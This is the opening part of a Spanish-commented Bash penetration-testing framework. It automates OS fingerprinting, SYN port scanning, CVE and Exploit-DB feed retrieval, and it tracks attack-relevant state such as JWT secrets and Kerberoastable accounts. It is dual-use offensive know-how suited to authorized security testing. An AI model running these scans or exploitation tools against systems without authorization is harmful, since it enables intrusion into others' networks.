#!/usr/bin/env bash
#
# ╔══════════════════════════════════════════════════════════════╗
# ║   WriestTavo v8.0 :: by WRIΞSTTAV0                           ║
# ║   Bug Bounty | Pentesting | Análisis de Vulnerabilidades     ║
# ║                                                              ║
# ║   MÓDULOS:                                                   ║
# ║   [1] TTL / OS Fingerprinting                                ║
# ║   [2] Port Discovery (Fast SYN)                              ║
# ║   [3] Service & Version Fingerprinting                       ║
# ║   [4] Web Recon  (whatweb, nikto, gobuster)                  ║
# ║   [5] Subdomain Enumeration  (subfinder / amass)             ║
# ║   [6] WAF Detection  (wafw00f)                               ║
# ║   [7] HTTP Headers Analysis                                  ║
# ║   [8] SMB Enumeration  (enum4linux-ng)                       ║
# ║   [9] Vulnerability Scan  (nmap vuln + searchsploit)         ║
# ║  [10] Reporte HTML profesional                               ║
# ╚══════════════════════════════════════════════════════════════╝

set -uo pipefail

# ─── COLORES ────────────────────────────────────────────────────
C_RST="\e[0m";   C_RED="\e[31m";   C_GRN="\e[32m"
C_YEL="\e[33m";  C_BLU="\e[34m";   C_CYN="\e[36m"
C_PUR="\e[35m";  C_BOLD="\e[1m";   C_DIM="\e[2m"

# ─── CONFIGURACIÓN GLOBAL ───────────────────────────────────────
TARGET=""
OUTPUT_DIR="wriestTavo_results"
TIMESTAMP=$(date +"%Y%m%d_%H%M%S")
OPEN_PORTS_CSV=""
WEB_PORTS=()
SCAN_MODE="normal"   # normal | stealth | aggressive
REPORT_FILE=""
FINDINGS=()

# ════════════════════════════════════════════════════════════════
# ESTADO INTELIGENTE v8.0 — RETROALIMENTACIÓN TOTAL
# Cada módulo escribe aquí. Los siguientes leen y se adaptan.
# ════════════════════════════════════════════════════════════════

# ── Infraestructura base ──
INTEL_OS=""                    # linux | windows | unknown
INTEL_WAF_DETECTED=false
INTEL_WAF_NAME=""
INTEL_SCAN_DELAY=0

# ── Stack de aplicación ──
INTEL_CMS=""                   # wordpress | joomla | drupal | magento
INTEL_FRAMEWORK_JS=""          # react | nextjs | vue | nuxt | angular | svelte | astro | remix
INTEL_FRAMEWORK_BACKEND=""     # laravel | symfony | django | flask | fastapi | nestjs | express | aspnet | dotnetcore | rails
INTEL_TECHNOLOGIES=()          # php, nodejs, python, java, ruby, golang...
INTEL_SERVICES=()
INTEL_SUBDOMAINS=()
INTEL_WORDLIST_EXTRA=""

# ── Endpoints y URLs ──
INTEL_INJECTABLE_URLS=()       # URLs con parámetros para probar
INTEL_API_ENDPOINTS=()         # Endpoints API descubiertos
INTEL_SENSITIVE_PATHS=()       # Rutas sensibles encontradas
INTEL_FRAMEWORK_ROUTES=()      # Rutas específicas del framework detectado

# ── Tokens y secretos ──
INTEL_JWT_TOKENS=()            # JWTs encontrados en JS/headers/responses
INTEL_JS_SECRETS=()            # Secrets en JS
INTEL_API_KEYS=()              # API keys encontradas

# ── APIs ──
INTEL_GRAPHQL_URL=""
INTEL_SWAGGER_URL=""
INTEL_OPENAPI_ENDPOINTS=()     # Endpoints parseados de Swagger/OpenAPI

# ── Estado de vulns encontradas ──
INTEL_SQLI_FOUND=false
INTEL_XSS_FOUND=false
INTEL_LFI_FOUND=false
INTEL_LFI_PARAM=""             # Parámetro vulnerable a LFI
INTEL_LFI_URL=""               # URL vulnerable a LFI
INTEL_SSRF_FOUND=false
INTEL_SSRF_URL=""
INTEL_SSTI_FOUND=false
INTEL_CORS_VULN=false
INTEL_CORS_ORIGIN=""           # Origen aceptado (para PoC CSRF)
INTEL_NOSQLI_FOUND=false
INTEL_JWT_ALG_NONE=false       # true si alg:none funciona
INTEL_JWT_WEAK_SECRET=""       # Secret crackeado si se encontró
INTEL_DOCKER_EXPOSED=false     # Puerto 2375/2376 abierto
INTEL_K8S_EXPOSED=false        # Dashboard K8s expuesto
INTEL_NIKTO_FINDINGS=""

# ── Cloud ──
INTEL_CLOUD_PROVIDER=""        # aws | gcp | azure | cloudflare | ""
INTEL_BEHIND_CDN=false
# ── Active Directory INTEL ────────────────────────────────────
INTEL_AD_DOMAIN=""
INTEL_AD_DC=""
INTEL_AD_USERS=()
INTEL_AD_ADMINS=()
INTEL_AD_KERBEROASTABLE=()
INTEL_AD_ASREP_USERS=()
INTEL_AD_PASSWORD_POLICY=""
INTEL_AD_ADCS_FOUND=false
INTEL_AD_LAPS_DEPLOYED=false
INTEL_AD_NULL_SESSIONS=false
INTEL_AD_CREDS=""
INTEL_NVD_CVES=()           # CVEs de NVD para el stack
INTEL_GHSA_VULNS=()         # GitHub Security Advisories
INTEL_EDB_RESULTS=()        # Exploits EDB encontrados
INTEL_XXE_FOUND=false           # true si se confirmó XXE
INTEL_IDOR_FOUND=false          # true si se detectó IDOR potencial
INTEL_OPEN_REDIRECT_FOUND=false # true si se confirmó open redirect
INTEL_IIS_SHORTNAME=false       # true si IIS ShortName vulnerable
INTEL_WEBDAV=false              # true si WebDAV habilitado
# ── ADPulse ──────────────────────────────────────────────────────
AD_DOMAIN=""
AD_DOMAIN_FQDN=""
AD_DC_IP=""
AD_BASE_DN=""
AD_USER=""
AD_PASS=""
AD_USER_FULL=""
AD_OUT_DIR=""
AD_CRITICAL=0; AD_HIGH=0; AD_MEDIUM=0; AD_LOW=0; AD_INFO=0
AD_KERBEROASTABLE=()
AD_ASREPROASTABLE=()
AD_ADCS_TEMPLATES=()
AD_UNCONSTRAINED=()
AD_DA_MEMBERS=()
AD_PASS_NEVER_EXPIRES=()
AD_INACTIVE_ACCOUNTS=()

intel_log() {
    echo -e "${C_PUR}  [INTEL]${C_RST} $1"
}

# Función helper: agregar URL a lista si no existe
intel_add_url() {
    local arr_name="$1" url="$2"
    local arr_ref="${arr_name}[@]"
    for existing in "${!arr_ref}"; do
        [[ "$existing" == "$url" ]] && return
    done
    eval "${arr_name}+=("\${url}")"
}

trap 'echo -e "\n\n${C_YEL}[!] Abortado por el usuario.${C_RST}"; exit 1' INT

# ─── UTILS ──────────────────────────────────────────────────────
log()    { echo -e "${C_BLU}[*]${C_RST} $1"; }
ok()     { echo -e "${C_GRN}[+]${C_RST} $1"; }
warn()   { echo -e "${C_YEL}[!]${C_RST} $1"; }
err()    { echo -e "${C_RED}[-]${C_RST} $1"; }
tip()    { echo -e "${C_PUR}[TIP]${C_RST} $1"; }
cmd_show(){ echo -e "  ${C_DIM}CMD:${C_RST} ${C_CYN}$1${C_RST}\n"; }

# add_finding SEVERITY TITLE DETAIL [CVSS] [REMEDIATION] [NEXT_STEP]
add_finding() {
    local sev="$1" title="$2" detail="$3"
    local cvss="${4:-}"
    local remediation="${5:-}"
    local next_step="${6:-}"
    # Auto-assign CVSS if not provided
    if [[ -z "$cvss" ]]; then
        case "$sev" in
            "CRÍTICO") cvss="9.0-10.0" ;;
            "ALTO")    cvss="7.0-8.9"  ;;
            "MEDIO")   cvss="4.0-6.9"  ;;
            "BAJO")    cvss="0.1-3.9"  ;;
            *)         cvss="N/A"      ;;
        esac
    fi
    # Auto-assign remediation if not provided
    if [[ -z "$remediation" ]]; then
        case "$sev" in
            "CRÍTICO") remediation="Corregir de inmediato. Notificar al equipo de seguridad." ;;
            "ALTO")    remediation="Planificar corrección en el próximo sprint/ciclo." ;;
            "MEDIO")   remediation="Incluir en backlog de seguridad con prioridad media." ;;
            "BAJO")    remediation="Revisar en la siguiente auditoría." ;;
            *)         remediation="Documentar y evaluar según política interna." ;;
        esac
    fi
    FINDINGS+=("${sev}|||${title}|||${detail}|||${cvss}|||${remediation}|||${next_step}")
}

is_domain() {
    [[ "$1" =~ ^[a-zA-Z] ]] && return 0 || return 1
}

is_web_port() {
    local p="$1"
    [[ "$p" == "80" || "$p" == "443" || "$p" == "8080" || "$p" == "8443" || "$p" == "8000" || "$p" == "8888" || "$p" == "8888" || "$p" == "3000" || "$p" == "5000" ]]
}

# ─── BANNER ─────────────────────────────────────────────────────
SCRIPT_VERSION="4.0"
SCRIPT_PATH="$(realpath "$0")"

show_banner() {
    clear
    echo -e "${C_BLU}"
    echo "  ╔══════════════════════════════════════════════════════╗"
    echo "  ║   WriestTavo v8.0  ::  WRIΞSTTAV0                    ║"
    echo "  ║   41 módulos · Stack Moderno · Auto-Update           ║"
    echo "  ║   Bug Bounty | Pentesting | CVE Feed | CTF           ║"
    echo "  ╚══════════════════════════════════════════════════════╝"
    echo -e "${C_RST}"
    echo -e "  Target  : ${C_YEL}${TARGET}${C_RST}"
    echo -e "  Modo    : ${C_CYN}${SCAN_MODE}${C_RST}"
    echo -e "  Output  : ${C_CYN}${OUTPUT_DIR}/${C_RST}"
    echo -e "  Fecha   : ${C_DIM}${TIMESTAMP}${C_RST}"
    echo
}

# ─── VALIDACIONES ───────────────────────────────────────────────
check_root() {
    if [[ "${EUID}" -ne 0 ]]; then
        err "Se requiere sudo para escaneos SYN (-sS)."
        echo -e "  Uso: ${C_YEL}sudo $0 [opciones] <IP|dominio>${C_RST}"
        exit 1
    fi
}

check_deps() {
    local missing=()
    local tools=(ping nmap awk grep curl xsltproc python3)
    # Herramientas por categoría
    local web_tools=(whatweb nikto gobuster wafw00f nuclei ffuf dalfox commix arjun)
    local recon_tools=(subfinder theHarvester dnsrecon amass sslscan sslyze)
    local exploit_tools=(searchsploit sqlmap wpscan crackmapexec enum4linux-ng smtp-user-enum snmpwalk ldapsearch bloodhound-python)
    local optional_go=(dalfox arjun)

    echo -e "${C_BLU}[*] Verificando dependencias v8.0...${C_RST}"
    for cmd in "${tools[@]}"; do
        command -v "$cmd" >/dev/null 2>&1 || missing+=("$cmd")
    done

    if [[ ${#missing[@]} -gt 0 ]]; then
        err "Herramientas obligatorias faltantes: ${missing[*]}"
        echo -e "  Instala: ${C_YEL}sudo apt install ${missing[*]}${C_RST}"
        exit 1
    fi

    local have=0 missing_opt=()
    echo -e "  ${C_GRN}[✓] Core tools OK${C_RST}"
    for cat_name in "Web" "Recon" "Exploit"; do
        case "$cat_name" in
            Web)    local arr=("${web_tools[@]}") ;;
            Recon)  local arr=("${recon_tools[@]}") ;;
            Exploit)local arr=("${exploit_tools[@]}") ;;
        esac
        local cat_ok="" cat_miss=""
        for cmd in "${arr[@]}"; do
            if command -v "$cmd" >/dev/null 2>&1; then
                cat_ok+=" $cmd"
                ((have++))
            else
                cat_miss+=" $cmd"
                missing_opt+=("$cmd")
            fi
        done
        [[ -n "$cat_ok"   ]] && echo -e "  ${C_GRN}[✓]${C_RST} ${cat_name}:${cat_ok}"
        [[ -n "$cat_miss" ]] && echo -e "  ${C_YEL}[~]${C_RST} ${cat_name} faltantes:${cat_miss}"
    done

    echo -e "  Cobertura: ${C_GRN}${have}${C_RST} / $((${#web_tools[@]}+${#recon_tools[@]}+${#exploit_tools[@]})) herramientas opcionales"
    echo
}

preparar_directorio() {
    mkdir -p "${OUTPUT_DIR}"/{nmap,web,recon,exploits,screenshots}
    local safe_target
    safe_target=$(echo "$TARGET" | sed 's|[/:.]|_|g')
    REPORT_FILE="${OUTPUT_DIR}/reporte_${safe_target}_${TIMESTAMP}.html"
}


# ════════════════════════════════════════════════════════════════
# SISTEMA DE AUTO-ACTUALIZACIÓN v8.0
# ════════════════════════════════════════════════════════════════

# ─── CONFIGURACIÓN DE ACTUALIZACIÓN ──────────────────────────────
UPDATE_DIR="${HOME}/.wriestTavo"
CVE_CACHE="${UPDATE_DIR}/cve_cache"
CUSTOM_PAYLOADS="${UPDATE_DIR}/custom_payloads"
NUCLEI_TEMPLATES="${HOME}/nuclei-templates"
LAST_UPDATE_FILE="${UPDATE_DIR}/last_update.txt"
CUSTOM_MODULES_DIR="${UPDATE_DIR}/modules"
INTEL_EXTRA_PAYLOADS_LFI=()
INTEL_EXTRA_PAYLOADS_SQLI=()
INTEL_EXTRA_PAYLOADS_XSS=()
INTEL_RECENT_CVES=()
INTEL_TECH_CVES=()   # CVEs específicos del tech stack detectado

# ─── INICIALIZAR DIRECTORIOS DE ACTUALIZACIÓN ───────────────────
init_update_system() {
    mkdir -p "${UPDATE_DIR}" "${CVE_CACHE}" "${CUSTOM_PAYLOADS}" "${CUSTOM_MODULES_DIR}"
    # Crear archivos de payloads custom si no existen
    [[ ! -f "${CUSTOM_PAYLOADS}/sqli_extra.txt" ]]  && touch "${CUSTOM_PAYLOADS}/sqli_extra.txt"
    [[ ! -f "${CUSTOM_PAYLOADS}/xss_extra.txt" ]]   && touch "${CUSTOM_PAYLOADS}/xss_extra.txt"
    [[ ! -f "${CUSTOM_PAYLOADS}/lfi_extra.txt" ]]   && touch "${CUSTOM_PAYLOADS}/lfi_extra.txt"
    [[ ! -f "${CUSTOM_PAYLOADS}/paths_extra.txt" ]] && touch "${CUSTOM_PAYLOADS}/paths_extra.txt"
    [[ ! -f "${CUSTOM_PAYLOADS}/ssrf_extra.txt" ]]  && touch "${CUSTOM_PAYLOADS}/ssrf_extra.txt"
}

# ─── MÓDULO DE ACTUALIZACIÓN PRINCIPAL ──────────────────────────
modulo_update() {
    log "══ WriestTavo Auto-Updater ══════════════════════"

    init_update_system

    local last_update="nunca"
    [[ -f "$LAST_UPDATE_FILE" ]] && last_update=$(cat "$LAST_UPDATE_FILE")
    echo -e "  Última actualización: ${C_CYN}${last_update}${C_RST}"
    echo

    # ── 1. NUCLEI TEMPLATES (la más importante) ──────────────────
    if command -v nuclei >/dev/null 2>&1; then
        log "  [1/5] Actualizando nuclei templates..."
        nuclei -update-templates -silent 2>/dev/null && \
            ok "Nuclei templates actualizados ($(nuclei -version 2>&1 | head -1))" || \
            warn "Error actualizando nuclei templates"

        # Contar templates nuevos
        local tpl_count
        tpl_count=$(find "${HOME}/nuclei-templates" -name "*.yaml" 2>/dev/null | wc -l)
        intel_log "Nuclei: ${tpl_count} templates disponibles"
    else
        warn "Nuclei no instalado: sudo apt install nuclei"
    fi

    # ── 2. CVE FEED — NVD API (últimas 48h) ──────────────────────
    log "  [2/5] Descargando CVEs recientes (NVD)..."
    local nvd_cache="${CVE_CACHE}/nvd_recent.json"
    local two_days_ago
    two_days_ago=$(date -d "2 days ago" +%Y-%m-%dT%H:%M:%S 2>/dev/null || \
                   date -v-2d +%Y-%m-%dT%H:%M:%S 2>/dev/null || \
                   echo "2024-01-01T00:00:00")
    local today
    today=$(date +%Y-%m-%dT%H:%M:%S)

    local nvd_resp
    nvd_resp=$(curl -skL --max-time 20 \
        "https://services.nvd.nist.gov/rest/json/cves/2.0?pubStartDate=${two_days_ago}&pubEndDate=${today}&resultsPerPage=20" \
        2>/dev/null)

    if echo "$nvd_resp" | python3 -c "import json,sys; d=json.load(sys.stdin); print(len(d.get('vulnerabilities',[])),'CVEs')" 2>/dev/null; then
        echo "$nvd_resp" > "$nvd_cache"
        # Parsear CVEs críticos (CVSS >= 9.0)
        python3 - << PYNVD
import json, sys
try:
    with open("${nvd_cache}") as f: data = json.load(f)
    critical = []
    for v in data.get("vulnerabilities", []):
        cve = v.get("cve", {})
        cve_id = cve.get("id", "")
        desc = cve.get("descriptions", [{}])[0].get("value", "")[:120]
        metrics = cve.get("metrics", {})
        score = 0
        for key in ["cvssMetricV31", "cvssMetricV30", "cvssMetricV2"]:
            if key in metrics:
                score = metrics[key][0].get("cvssData", {}).get("baseScore", 0)
                break
        if score >= 9.0:
            critical.append(f"{cve_id} (CVSS:{score}) — {desc}")
    if critical:
        print(f"  CVEs CRÍTICOS (CVSS≥9.0) últimas 48h: {len(critical)}")
        for c in critical[:5]: print(f"    • {c}")
    else:
        print("  Sin CVEs críticos en las últimas 48h")
except Exception as e:
    print(f"  Error parseando NVD: {e}")
PYNVD
        ok "CVE feed actualizado: ${nvd_cache}"
    else
        warn "No se pudo conectar a NVD API. Verificar internet."
    fi

    # ── 3. EXPLOIT-DB RSS FEED ────────────────────────────────────
    log "  [3/5] Exploit-DB feed reciente..."
    local edb_cache="${CVE_CACHE}/exploitdb_recent.txt"
    local edb_feed
    edb_feed=$(curl -skL --max-time 15 \
        "https://www.exploit-db.com/rss.xml" 2>/dev/null | \
        grep -oP '(?<=<title>)[^<]+' | grep -v "^Exploit" | head -10)

    if [[ -n "$edb_feed" ]]; then
        echo "$edb_feed" > "$edb_cache"
        echo -e "${C_YEL}  Exploits recientes en Exploit-DB:${C_RST}"
        echo "$edb_feed" | head -8 | while IFS= read -r line; do
            echo -e "    ${C_DIM}•${C_RST} $line"
        done
        ok "Exploit-DB feed guardado: ${edb_cache}"
    else
        warn "No se pudo obtener feed de Exploit-DB"
    fi

    # ── 4. ACTUALIZAR PAYLOADS DESDE PAYLOADBOX/SECLISTS ─────────
    log "  [4/5] Actualizando SecLists / payloads..."

    # Actualizar SecLists si está como repo git
    if [[ -d "/usr/share/seclists/.git" ]]; then
        git -C /usr/share/seclists pull --quiet 2>/dev/null && \
            ok "SecLists actualizado" || warn "Error actualizando SecLists"
    elif [[ -d "${HOME}/SecLists/.git" ]]; then
        git -C "${HOME}/SecLists" pull --quiet 2>/dev/null && ok "SecLists actualizado"
    else
        warn "SecLists no es repo git. Instalar: sudo apt install seclists"
    fi

    # Cargar payloads extra desde archivos custom del usuario
    _load_custom_payloads

    # ── 5. ACTUALIZAR SCRIPT (si hay nueva versión en GitHub) ─────
    log "  [5/5] Verificando actualizaciones del script..."
    _check_script_update

    # ── Guardar timestamp ─────────────────────────────────────────
    date '+%Y-%m-%d %H:%M' > "$LAST_UPDATE_FILE"
    ok "Actualización completa. Próxima: ejecuta --update cuando quieras."
    echo
}

# ─── CARGAR PAYLOADS CUSTOM DEL USUARIO ─────────────────────────
_load_custom_payloads() {
    local loaded=0

    # SQLi extra
    if [[ -s "${CUSTOM_PAYLOADS}/sqli_extra.txt" ]]; then
        while IFS= read -r line; do
            [[ -n "$line" && ! "$line" =~ ^# ]] && INTEL_EXTRA_PAYLOADS_SQLI+=("$line")
        done < "${CUSTOM_PAYLOADS}/sqli_extra.txt"
        ((loaded+=${#INTEL_EXTRA_PAYLOADS_SQLI[@]}))
    fi

    # XSS extra
    if [[ -s "${CUSTOM_PAYLOADS}/xss_extra.txt" ]]; then
        while IFS= read -r line; do
            [[ -n "$line" && ! "$line" =~ ^# ]] && INTEL_EXTRA_PAYLOADS_XSS+=("$line")
        done < "${CUSTOM_PAYLOADS}/xss_extra.txt"
        ((loaded+=${#INTEL_EXTRA_PAYLOADS_XSS[@]}))
    fi

    # LFI extra
    if [[ -s "${CUSTOM_PAYLOADS}/lfi_extra.txt" ]]; then
        while IFS= read -r line; do
            [[ -n "$line" && ! "$line" =~ ^# ]] && INTEL_EXTRA_PAYLOADS_LFI+=("$line")
        done < "${CUSTOM_PAYLOADS}/lfi_extra.txt"
        ((loaded+=${#INTEL_EXTRA_PAYLOADS_LFI[@]}))
    fi

    [[ $loaded -gt 0 ]] && intel_log "Payloads custom cargados: ${loaded} total"
}

# ─── BUSCAR CVES PARA EL STACK DETECTADO ────────────────────────
buscar_cves_stack() {
    # Se llama después de detectar tecnologías (módulo 3+6)
    # Busca CVEs específicos del tech stack en NVD
    [[ ${#INTEL_TECHNOLOGIES[@]} -eq 0 ]] && return

    local cache="${CVE_CACHE}/stack_cves_${TIMESTAMP}.txt"
    echo "CVEs del stack — $(date)" > "$cache"

    intel_log "Buscando CVEs para stack: ${INTEL_TECHNOLOGIES[*]}"

    for tech in "${INTEL_TECHNOLOGIES[@]}"; do
        # Mapear tech a keywords de búsqueda NVD
        local keyword=""
        case "$tech" in
            apache)     keyword="apache+httpd" ;;
            nginx)      keyword="nginx" ;;
            php)        keyword="php" ;;
            laravel)    keyword="laravel" ;;
            wordpress)  keyword="wordpress" ;;
            nodejs)     keyword="node.js" ;;
            express)    keyword="expressjs" ;;
            django)     keyword="django" ;;
            flask)      keyword="flask" ;;
            fastapi)    keyword="fastapi" ;;
            aspnet)     keyword="asp.net" ;;
            dotnetcore) keyword="dotnet+core" ;;
            spring)     keyword="spring+framework" ;;
            tomcat)     keyword="apache+tomcat" ;;
            mysql)      keyword="mysql" ;;
            postgresql) keyword="postgresql" ;;
            mongodb)    keyword="mongodb" ;;
            redis)      keyword="redis" ;;
            elasticsearch) keyword="elasticsearch" ;;
            docker)     keyword="docker" ;;
            *)          continue ;;
        esac

        local nvd_url="https://services.nvd.nist.gov/rest/json/cves/2.0?keywordSearch=${keyword}&resultsPerPage=5&cvssV3Severity=CRITICAL"
        local resp
        resp=$(curl -skL --max-time 10 "$nvd_url" 2>/dev/null)

        if [[ -n "$resp" ]]; then
            python3 - << PYCVE
import json, sys
try:
    data = json.loads("""$resp""")
    cves = data.get("vulnerabilities", [])
    if cves:
        print(f"  ${tech} — {len(cves)} CVEs críticos recientes:")
        for v in cves[:3]:
            cve = v.get("cve", {})
            cid = cve.get("id","")
            desc = cve.get("descriptions",[{}])[0].get("value","")[:100]
            print(f"    [{cid}] {desc}")
            with open("${cache}", "a") as f:
                f.write(f"{cid}|{tech}|{desc}\n")
except: pass
PYCVE
        fi
        sleep 0.5  # Rate limit NVD API
    done

    # Cargar CVEs encontrados al intel
    if [[ -s "$cache" ]]; then
        while IFS='|' read -r cve_id tech_name desc; do
            [[ -n "$cve_id" ]] && INTEL_TECH_CVES+=("${cve_id}:${tech_name}:${desc}")
        done < <(tail -n +2 "$cache")
        intel_log "Stack CVEs cargados: ${#INTEL_TECH_CVES[@]} CVEs para ${INTEL_TECHNOLOGIES[*]}"
    fi
}

# ─── VERIFICAR ACTUALIZACIÓN DEL SCRIPT ─────────────────────────
_check_script_update() {
    # Si el usuario tiene el script en un repo git propio, hace pull
    local script_dir
    script_dir=$(dirname "$SCRIPT_PATH")

    if [[ -d "${script_dir}/.git" ]]; then
        local remote_hash
        remote_hash=$(git -C "$script_dir" fetch origin 2>/dev/null && \
                      git -C "$script_dir" rev-parse origin/main 2>/dev/null || echo "")
        local local_hash
        local_hash=$(git -C "$script_dir" rev-parse HEAD 2>/dev/null || echo "")

        if [[ -n "$remote_hash" && "$remote_hash" != "$local_hash" ]]; then
            warn "Nueva versión disponible en el repo. Ejecuta: git -C ${script_dir} pull"
        else
            ok "Script actualizado (no hay cambios remotos)"
        fi
    else
        ok "Script no vinculado a git (versión standalone). Actualización manual requerida."
        tip "Para auto-actualizarse: sube el script a un repo git privado."
    fi
}

# ─── CARGAR MÓDULOS CUSTOM EXTERNOS ─────────────────────────────
load_custom_modules() {
    # El usuario puede agregar módulos propios en ~/.wriestTavo/modules/
    # Formato: modulo_mi_vuln_nueva.sh — debe contener función modulo_*()
    [[ ! -d "$CUSTOM_MODULES_DIR" ]] && return

    local count=0
    for mod_file in "${CUSTOM_MODULES_DIR}"/*.sh; do
        [[ -f "$mod_file" ]] || continue
        # Validar sintaxis antes de cargar
        if bash -n "$mod_file" 2>/dev/null; then
            source "$mod_file"
            ((count++))
            intel_log "Módulo custom cargado: $(basename $mod_file)"
        else
            warn "Módulo custom con error de sintaxis: $mod_file (saltando)"
        fi
    done
    [[ $count -gt 0 ]] && ok "${count} módulo(s) custom cargados desde ${CUSTOM_MODULES_DIR}"
}

# ─── USAR CVEs EN EL REPORTE ────────────────────────────────────
_report_stack_cves() {
    # Agrega sección de CVEs del stack al reporte
    [[ ${#INTEL_TECH_CVES[@]} -eq 0 ]] && return

    local cve_html=""
    for entry in "${INTEL_TECH_CVES[@]}"; do
        local cve_id tech_name desc
        IFS=':' read -r cve_id tech_name desc <<< "$entry"
        local nvd_url="https://nvd.nist.gov/vuln/detail/${cve_id}"
        local edb_url="https://www.exploit-db.com/search?cve=${cve_id#CVE-}"
        cve_html+="<tr>"
        cve_html+="<td><a href='${nvd_url}' target='_blank'>${cve_id}</a></td>"
        cve_html+="<td>${tech_name}</td>"
        cve_html+="<td>${desc}</td>"
        cve_html+="<td><a href='${edb_url}' target='_blank'>Buscar exploit</a></td>"
        cve_html+="</tr>"
    done

    add_finding "ALTO" \
        "CVEs Recientes del Stack Detectado (${#INTEL_TECH_CVES[@]})" \
        "<table class='vuln-table'><tr><th>CVE</th><th>Tecnología</th><th>Descripción</th><th>Exploit</th></tr>${cve_html}</table>" \
        "8.0" \
        "Verificar si la versión instalada está dentro del rango vulnerable de cada CVE. Aplicar parches disponibles." \
        "searchsploit CVE-XXXX-XXXX | Para cada CVE: curl https://nvd.nist.gov/vuln/detail/CVE-XXXX"
}


# ─── MÓDULO 1: TTL / OS ─────────────────────────────────────────
modulo_ttl_os() {
    log "MÓDULO 1: TTL / OS Fingerprinting"
    local ttl
    ttl=$(ping -c1 -W2 "$TARGET" 2>/dev/null | awk -F'ttl=' '/ttl=/{split($2,a," "); print a[1]; exit}')

    if [[ -z "${ttl}" ]]; then
        warn "Host no responde a ICMP ping. Continuando con -Pn."
        add_finding "INFO" "ICMP Bloqueado" "El host no responde a ping, posible firewall/filtrado ICMP."
        return
    fi

    local os="Desconocido"
    local color="$C_YEL"
    if   (( ttl <= 64  )); then os="Linux / Unix / Android"; color="$C_GRN"
    elif (( ttl <= 128 )); then os="Windows";                color="$C_CYN"
    elif (( ttl <= 255 )); then os="Cisco / Solaris / Otro"; color="$C_YEL"
    fi

    echo -e "  ${color}OS estimado: ${os} (TTL=${ttl})${C_RST}"
    tip "TTL real puede ser distinto por saltos de red. Úsalo como referencia."
    add_finding "INFO" "OS Fingerprinting (TTL)" "TTL=${ttl} → Probable SO: ${os}"
    # ── INTEL: guardar OS para módulos posteriores ──
    if   (( ttl <= 64  )); then INTEL_OS="linux"
    elif (( ttl <= 128 )); then INTEL_OS="windows"
    else                        INTEL_OS="other"
    fi
    intel_log "OS detectado → ${INTEL_OS} (influye en wordlists y técnicas)"
    echo
}

# ─── MÓDULO 2: PORT DISCOVERY ───────────────────────────────────
modulo_port_scan() {
    log "MÓDULO 2: Port Discovery (SYN Scan — 2 fases)"

    # ── Configuración por modo ──────────────────────────────────
    local min_rate_fast min_rate_full extra_flags top_ports
    case "$SCAN_MODE" in
        stealth)
            min_rate_fast=500;  min_rate_full=300
            extra_flags="-n -Pn -T2"; top_ports=500
            tip "Modo STEALTH: fase 1 = top-${top_ports} puertos (silencioso y rápido)."
            ;;
        aggressive)
            min_rate_fast=8000; min_rate_full=6000
            extra_flags="-n -Pn -T5"; top_ports=1000
            ;;
        *)  # normal
            min_rate_fast=3000; min_rate_full=2000
            extra_flags="-n -Pn -T4"; top_ports=1000
            ;;
    esac

    # ── FASE A: Top-ports (rápido, siempre corre) ───────────────
    echo -e "  ${C_CYN}▶ Fase A — Top ${top_ports} puertos (rápido)${C_RST}"
    local cmd_a="nmap ${extra_flags} -sS --open --top-ports ${top_ports} --min-rate ${min_rate_fast} ${TARGET}"
    cmd_show "$cmd_a"

    local nmap_out_a
    nmap_out_a=$(nmap ${extra_flags} -sS --open \
        --top-ports ${top_ports} --min-rate ${min_rate_fast} \
        "${TARGET}" 2>/dev/null)

    local puertos_a
    puertos_a=$(echo "${nmap_out_a}" | grep '^[0-9]' | cut -d'/' -f1)

    if [[ -n "$puertos_a" ]]; then
        local csv_a
        csv_a=$(echo "${puertos_a}" | paste -sd ',' -)
        ok "Fase A — Puertos encontrados: ${C_YEL}${csv_a}${C_RST}"
        echo "${nmap_out_a}" > "${OUTPUT_DIR}/nmap/phase_a_top_ports.txt"
    else
        warn "Fase A — 0 puertos en top-${top_ports}."
    fi

    # ── FASE B: Todos los puertos (background, opcional) ────────
    echo
    echo -e "  ${C_CYN}▶ Fase B — Escaneo completo -p- (65535 puertos)${C_RST}"
    echo -e "  ${C_YEL}  Esto puede tardar varios minutos.${C_RST}"
    echo -ne "  ${C_YEL}¿Ejecutar escaneo completo en segundo plano? [s/N]: ${C_RST}"
    read -r run_full

    local nmap_out_b=""
    local puertos_b=""
    if [[ "${run_full,,}" =~ ^(s|si|y|yes|1)$ ]]; then
        local cmd_b="nmap ${extra_flags} -sS --open -p- --min-rate ${min_rate_full} ${TARGET}"
        cmd_show "$cmd_b"
        local bg_file="${OUTPUT_DIR}/nmap/phase_b_fullscan.txt"
        nmap ${extra_flags} -sS --open -p- --min-rate ${min_rate_full} \
            "${TARGET}" > "${bg_file}" 2>/dev/null &
        local bg_pid=$!
        echo -e "  ${C_GRN}[PID ${bg_pid}] Escaneo completo corriendo en background.${C_RST}"
        echo -e "  ${C_DIM}  Resultado en: ${bg_file}${C_RST}"
        echo -e "  ${C_DIM}  Seguimiento: tail -f ${bg_file}${C_RST}"
        add_finding "INFO" "Escaneo Completo (background)" "PID=${bg_pid} → ${bg_file}"
    else
        warn "Escaneo completo omitido. Continuando con resultados de Fase A."
    fi

    # ── Consolidar puertos ──────────────────────────────────────
    local all_ports
    all_ports=$(echo -e "${puertos_a}\n${puertos_b}" | grep -v '^$' | sort -un)

    local nmap_out="${nmap_out_a}"

    local puertos_nl="$all_ports"

    if [[ -z "${puertos_nl}" ]]; then
        # Si vino una URL original, inferir puertos web desde el protocolo
        if [[ -n "$ORIGINAL_URL" ]]; then
            warn "nmap no detectó puertos abiertos. Infiriendo desde URL original..."
            if [[ "$ORIGINAL_URL" =~ ^https:// ]]; then
                WEB_PORTS=(443); OPEN_PORTS_CSV="443"
            else
                WEB_PORTS=(80);  OPEN_PORTS_CSV="80"
            fi
            ok "Puerto web asumido: ${C_YEL}${OPEN_PORTS_CSV}${C_RST} (basado en ${ORIGINAL_URL})"
            add_finding "INFO" "Puertos Web (inferidos)" "nmap bloqueado por firewall/CDN. Usando puerto ${OPEN_PORTS_CSV} desde URL."
        else
            err "0 puertos abiertos encontrados."
            add_finding "INFO" "Sin puertos abiertos" "No se detectaron puertos TCP abiertos en el target."
            return
        fi
    else
        OPEN_PORTS_CSV=$(echo "${puertos_nl}" | paste -sd ',' -)
        ok "Puertos abiertos: ${C_YEL}${OPEN_PORTS_CSV}${C_RST}"
        add_finding "INFO" "Puertos TCP Abiertos" "${OPEN_PORTS_CSV}"

        # Detectar puertos web para módulos posteriores
        while IFS= read -r p; do
            is_web_port "$p" && WEB_PORTS+=("$p")
